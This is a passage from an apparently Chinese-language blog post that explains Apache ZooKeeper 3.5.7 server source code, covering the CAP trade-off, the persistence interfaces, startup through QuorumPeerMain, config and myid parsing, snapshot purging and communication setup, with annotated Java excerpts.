Tolerance）</p><p>分布式系统在遇到任何网络分区故障的时候，仍然需要能够保证对外提供满足一致性和可用性的服务，除非是整个网络环境都发生了故障</p></li></ul><p>这三个基本需求，最多只能同时满足其中的两项，因为P是必须的，因此往往选择就在CP或者AP中。<strong>ZooKeeper保证的是CP</strong></p><ul><li><strong>ZooKeeper不能保证每次服务请求的可用性</strong>。（注：在极端环境下，ZooKeeper可能会丢弃一些请求，消费者程序需要重新请求才能获得结果）。所以说，ZooKeeper不能保证服务可用性。</li><li><strong>进行Leader选举时集群都是不可用</strong></li></ul><h1>二、源码详解</h1><blockquote><p>Zookeeper源码下载地址：<a href="https://archive.apache.org/dist/zookeeper/zookeeper-3.5.7/" target="_blank" rel="noopener" title="https://archive.apache.org/dist/zookeeper/zookeeper-3.5.7/">https://archive.apache.org/dist/zookeeper/zookeeper-3.5.7/</a></p></blockquote><h2 id="1、辅助源码">1、辅助源码</h2><h3 id="1-1-持久化源码-了解">1.1 持久化源码(了解)</h3><p>Leader 和 Follower 中的数据会在内存和磁盘中各保存一份。所以需要将内存中的数据持久化到磁盘中，在 org.apache.zookeeper.server.persistence 包下的相关类都是序列化相关的代码</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817151.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SnapShot</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 反序列化方法</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">deserialize</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 序列化方法</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">serialize</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,</span></span></span><br><span class="line"><span class="function"><span class="params">    File name)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *find the most recent snapshot file</span></span><br><span class="line"><span class="comment">    *查找最近的快照文件</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function">File <span class="title">findMostRecentSnapshot</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 释放资源</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TxnLog</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置服务状态</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setServerStats</span><span class="params">(ServerStats serverStats)</span></span>;</span><br><span class="line">    <span class="comment">// 滚动日志</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rollLog</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 追 加</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">append</span><span class="params">(TxnHeader hdr, Record r)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 读取数据</span></span><br><span class="line">    <span class="function">TxnIterator <span class="title">read</span><span class="params">(<span class="keyword">long</span> zxid)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 获取最后一个 zxid</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getLastLoggedZxid</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 删除日志</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">truncate</span><span class="params">(<span class="keyword">long</span> zxid)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 获 取 DbId</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getDbId</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 提 交</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 日志同步时间</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getTxnLogSyncElapsedTime</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 关闭日志</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 读取日志的接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TxnIterator</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取头信息</span></span><br><span class="line">        <span class="function">TxnHeader <span class="title">getHeader</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="comment">// 获取传输的内容</span></span><br><span class="line">        <span class="function">Record <span class="title">getTxn</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="comment">// 下一条记录</span></span><br><span class="line">        <span class="function"><span class="keyword">boolean</span> <span class="title">next</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">        <span class="comment">// 获取存储的大小</span></span><br><span class="line">        <span class="function"><span class="keyword">long</span> <span class="title">getStorageSize</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-序列化源码">1.2 序列化源码</h3><p>zookeeper-jute 代码是关于Zookeeper 序列化相关源码</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817152.png" alt></p><h2 id="2、ZK-服务端初始化源码解析">2、ZK 服务端初始化源码解析</h2><p><img src="http://qnypic.shawncoding.top/blog/202402291817153.png" alt></p><h3 id="2-1-启用脚本分析">2.1 启用脚本分析</h3><p><a href="http://zkServer.sh" target="_blank" rel="noopener">zkServer.sh</a> start 底层的实际执行内容，所以程序的入口是 QuorumPeerMain.java 类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nohup <span class="string">"<span class="variable">$JAVA</span>"</span> </span><br><span class="line">+ 一堆提交参数</span><br><span class="line">+ <span class="variable">$ZOOMAIN</span>(org.apache.zookeeper.server.quorum.QuorumPeerMain)</span><br><span class="line">+ <span class="string">"<span class="variable">$ZOOCFG</span>"</span>(zkEnv.sh 文件中 ZOOCFG=<span class="string">"zoo.cfg"</span>)</span><br></pre></td></tr></table></figure><h3 id="2-2-ZK-服务端启动入口">2.2 ZK 服务端启动入口</h3><p>源码里查找QuorumPeerMain类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建了一个 zk 节点</span></span><br><span class="line">    QuorumPeerMain main = <span class="keyword">new</span> QuorumPeerMain();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化节点并运行，args 相当于提交参数中的 zoo.cfg</span></span><br><span class="line">    main.initializeAndRun(args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    &#125;</span><br><span class="line">    LOG.info(<span class="string">"Exiting normally"</span>); System.exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initializeAndRun</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> ConfigException, IOException, AdminServerException</span>&#123;</span><br><span class="line">    <span class="comment">// 管理 zk 的配置信息</span></span><br><span class="line">    QuorumPeerConfig config = <span class="keyword">new</span> QuorumPeerConfig();</span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 1 解析参数，zoo.cfg 和 myid</span></span><br><span class="line">    config.parse(args[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2 启动定时任务，对过期的快照，执行删除（默认该功能关闭）</span></span><br><span class="line">    <span class="comment">// Start and schedule the the purge task</span></span><br><span class="line">    DatadirCleanupManager purgeMgr = <span class="keyword">new</span> DatadirCleanupManager(config</span><br><span class="line">    .getDataDir(), config.getDataLogDir(), config</span><br><span class="line">    .getSnapRetainCount(), config.getPurgeInterval()); purgeMgr.start();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">1</span> &amp;&amp; config.isDistributed()) &#123;</span><br><span class="line">    <span class="comment">// 3 启动集群</span></span><br><span class="line">    runFromConfig(config);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    LOG.warn(<span class="string">"Either no config or no quorum defined in config, running "</span></span><br><span class="line">    + <span class="string">" in standalone mode"</span>);</span><br><span class="line">    <span class="comment">// there is only server in the quorum -- run as standalone ZooKeeperServerMain.main(args);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-解析参数-zoo-cfg-和-myid">2.3 解析参数 zoo.cfg 和 myid</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(String path)</span> <span class="keyword">throws</span> ConfigException </span>&#123;</span><br><span class="line">    LOG.info(<span class="string">"Reading configuration from: "</span> + path);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 校验文件路径及是否存在</span></span><br><span class="line">    File configFile = (<span class="keyword">new</span> VerifyingFileFactory.Builder(LOG)</span><br><span class="line">    .warnForRelativePath()</span><br><span class="line">    .failForNonExistingPath()</span><br><span class="line">    .build()).create(path);</span><br><span class="line">    </span><br><span class="line">    Properties cfg = <span class="keyword">new</span> Properties();</span><br><span class="line">    FileInputStream in = <span class="keyword">new</span> FileInputStream(configFile); </span><br><span class="line">    <span class="comment">// 加载配置文件</span></span><br><span class="line">    cfg.load(in);</span><br><span class="line">    configFileStr = path;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    in.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 解析配置文件</span></span><br><span class="line">    parseProperties(cfg);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Error processing "</span> + path, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Error processing "</span> + path, e);</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// parseProperties(cfg)方法拉到最下面setupQuorumPeerConfig</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setupQuorumPeerConfig</span><span class="params">(Properties prop, <span class="keyword">boolean</span> configBackwardCompatibilityMode)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ConfigException </span>&#123;</span><br><span class="line">    quorumVerifier = parseDynamicConfig(prop, electionAlg, <span class="keyword">true</span>, configBackwardCompatibilityMode);</span><br><span class="line">    </span><br><span class="line">    setupMyId();</span><br><span class="line">    setupClientPort();</span><br><span class="line">    setupPeerType();</span><br><span class="line">    checkValidity();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setupMyId</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    File myIdFile = <span class="keyword">new</span> File(dataDir, <span class="string">"myid"</span>);</span><br><span class="line">    <span class="comment">// standalone server doesn't need myid file.</span></span><br><span class="line">    <span class="keyword">if</span> (!myIdFile.isFile()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(myIdFile));</span><br><span class="line">    String myIdString;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        myIdString = br.readLine();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        br.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 将解析 myid 文件中的 id 赋值给 serverId</span></span><br><span class="line">        serverId = Long.parseLong(myIdString);</span><br><span class="line">        MDC.put(<span class="string">"myid"</span>, myIdString);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"serverid "</span> + myIdString</span><br><span class="line">                + <span class="string">" is not a number"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-过期快照删除">2.4 过期快照删除</h3><p>可以启动定时任务，对过期的快照，执行删除。默认该功能时关闭的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2 启动定时任务，对过期的快照，执行删除（默认是关闭）</span></span><br><span class="line"><span class="comment">// config.getSnapRetainCount() = 3 最少保留的快照个数</span></span><br><span class="line"><span class="comment">// config.getPurgeInterval() = 0  默认 0 表示关闭</span></span><br><span class="line">DatadirCleanupManager purgeMgr = <span class="keyword">new</span> DatadirCleanupManager(config</span><br><span class="line">        .getDataDir(), config.getDataLogDir(), config</span><br><span class="line">        .getSnapRetainCount(), config.getPurgeInterval());</span><br><span class="line">purgeMgr.start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (PurgeTaskStatus.STARTED == purgeTaskStatus) &#123; </span><br><span class="line">        LOG.warn(<span class="string">"Purge task is already running."</span>); <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 默认情况 purgeInterval=0，该任务关闭，直接返回</span></span><br><span class="line">    <span class="comment">// Don't schedule the purge task with zero or negative purge interval.</span></span><br><span class="line">    <span class="keyword">if</span> (purgeInterval &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        LOG.info(<span class="string">"Purge task is not scheduled."</span>); </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建一个定时器</span></span><br><span class="line">    timer = <span class="keyword">new</span> Timer(<span class="string">"PurgeTask"</span>, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 创建一个清理快照任务</span></span><br><span class="line">    TimerTask task = <span class="keyword">new</span> PurgeTask(dataLogDir, snapDir, snapRetainCount);</span><br><span class="line">    <span class="comment">// 如果 purgeInterval 设置的值是 1，表示 1 小时检查一次，判断是否有过期快照， 有则删除</span></span><br><span class="line">    timer.scheduleAtFixedRate(task, <span class="number">0</span>, TimeUnit.HOURS.toMillis(purgeInterval));</span><br><span class="line">    </span><br><span class="line">    purgeTaskStatus = PurgeTaskStatus.STARTED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PurgeTask</span> <span class="keyword">extends</span> <span class="title">TimerTask</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> File logsDir;</span><br><span class="line">    <span class="keyword">private</span> File snapsDir; <span class="keyword">private</span> <span class="keyword">int</span> snapRetainCount;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PurgeTask</span><span class="params">(File dataDir, File snapDir, <span class="keyword">int</span> count)</span> </span>&#123; </span><br><span class="line">    logsDir = dataDir;</span><br><span class="line">    snapsDir = snapDir; snapRetainCount = count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        LOG.info(<span class="string">"Purge task started."</span>); </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 清理过期的数据</span></span><br><span class="line">            PurgeTxnLog.purge(logsDir, snapsDir, snapRetainCount);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            LOG.error(<span class="string">"Error occurred while purging."</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">            LOG.info(<span class="string">"Purge task completed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">purge</span><span class="params">(File dataDir, File snapDir, <span class="keyword">int</span> num)</span> <span class="keyword">throws</span> IOException </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(COUNT_ERR_MSG);</span><br><span class="line">    &#125;</span><br><span class="line">    FileTxnSnapLog txnLog = <span class="keyword">new</span> FileTxnSnapLog(dataDir, snapDir); </span><br><span class="line">    List&lt;File&gt; snaps = txnLog.findNRecentSnapshots(num);</span><br><span class="line">    <span class="keyword">int</span> numSnaps = snaps.size(); </span><br><span class="line">    <span class="keyword">if</span> (numSnaps &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        purgeOlderSnapshots(txnLog, snaps.get(numSnaps - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-初始化通信组件">2.5 初始化通信组件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (args.length == <span class="number">1</span> &amp;&amp; config.isDistributed()) &#123;</span><br><span class="line">    runFromConfig(config);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    LOG.warn(<span class="string">"Either no config or no quorum defined in config, running "</span></span><br><span class="line">            + <span class="string">" in standalone mode"</span>);</span><br><span class="line">    <span class="comment">// there is only server in the quorum -- run as standalone</span></span><br><span class="line">    ZooKeeperServerMain.main(args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通信协议默认 NIO</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runFromConfig</span><span class="params">(QuorumPeerConfig config)</span><span class="keyword">throws</span> IOException, AdminServerException</span>&#123;</span><br><span class="line">......</span><br><span class="line">LOG.info(<span class="string">"Starting quorum peer"</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ServerCnxnFactory cnxnFactory = <span class="keyword">null</span>;</span><br><span class="line">    ServerCnxnFactory secureCnxnFactory = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 通信组件初始化，默认是 NIO 通信</span></span><br><span class="line">    <span class="keyword">if</span> (config.getClientPortAddress() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// zookeeperAdmin.md 文件中</span></span><br><span class="line">        <span class="comment">//Default is `NIOServerCnxnFactory</span></span><br><span class="line">        cnxnFactory = ServerCnxnFactory.createFactory();</span><br><span class="line">        cnxnFactory.configure(config.getClientPortAddress(),</span><br><span class="line">        config.getMaxClientCnxns(), <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (config.getSecureClientPortAddress() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        secureCnxnFactory = ServerCnxnFactory.createFactory();</span><br><span class="line">        secureCnxnFactory.configure(config.getSecureClientPortAddress(),</span><br><span class="line">        config.getMaxClientCnxns(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把解析的参数赋值给该 zookeeper 节点</span></span><br><span class="line">    quorumPeer = getQuorumPeer();</span><br><span class="line">    quorumPeer.setTxnFactory(<span class="keyword">new</span> FileTxnSnapLog(</span><br><span class="line">    config.getDataLogDir(),</span><br><span class="line">    config.getDataDir()));</span><br><span class="line">    quorumPeer.enableLocalSessions(config.areLocalSessionsEnabled());</span><br><span class="line">    quorumPeer.enableLocalSessionsUpgrading(</span><br><span class="line">    config.isLocalSessionsUpgradingEnabled());</span><br><span class="line">    <span class="comment">//quorumPeer.setQuorumPeers(config.getAllMembers());</span></span><br><span class="line">    quorumPeer.setElectionType(config.getElectionAlg());</span><br><span class="line">    quorumPeer.setMyid(config.getServerId());</span><br><span class="line">    quorumPeer.setTickTime(config.getTickTime());</span><br><span class="line">    quorumPeer.setMinSessionTimeout(config.getMinSessionTimeout());</span><br><span class="line">    quorumPeer.setMaxSessionTimeout(config.getMaxSessionTimeout());</span><br><span class="line">    quorumPeer.setInitLimit(config.getInitLimit());</span><br><span class="line">    quorumPeer.setSyncLimit(config.getSyncLimit());</span><br><span class="line">    quorumPeer.setConfigFileName(config.getConfigFilename());</span><br><span class="line">    <span class="comment">// 管理 zk 数据的存储</span></span><br><span class="line">    quorumPeer.setZKDatabase(<span class="keyword">new</span> ZKDatabase(quorumPeer.getTxnFactory()));</span><br><span class="line">    quorumPeer.setQuorumVerifier(config.getQuorumVerifier(), <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (config.getLastSeenQuorumVerifier()!=<span class="keyword">null</span>) &#123;</span><br><span class="line">        quorumPeer.setLastSeenQuorumVerifier(config.getLastSeenQuorumVerifier(),<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   quorumPeer.initConfigInZKDatabase();</span><br><span class="line">   <span class="comment">// 管理 zk 的通信</span></span><br><span class="line">   quorumPeer.setCnxnFactory(cnxnFactory);</span><br><span class="line">   quorumPeer.setSecureCnxnFactory(secureCnxnFactory);</span><br><span class="line">   quorumPeer.setSslQuorum(config.isSslQuorum());</span><br><span class="line">   quorumPeer.setUsePortUnification(config.shouldUsePortUnification());</span><br><span class="line">   quorumPeer.setLearnerType(config.getPeerType());</span><br><span class="line">   quorumPeer.setSyncEnabled(config.getSyncEnabled());</span><br><span class="line">   quorumPeer.setQuorumListenOnAllIPs(config.getQuorumListenOnAllIPs());</span><br><span class="line">   <span class="keyword">if</span> (config.sslQuorumReloadCertFiles) &#123;</span><br><span class="line">       quorumPeer.getX509Util().enableCertFileReloading();</span><br><span class="line">   &#125;</span><br><span class="line">    ......</span><br><span class="line">    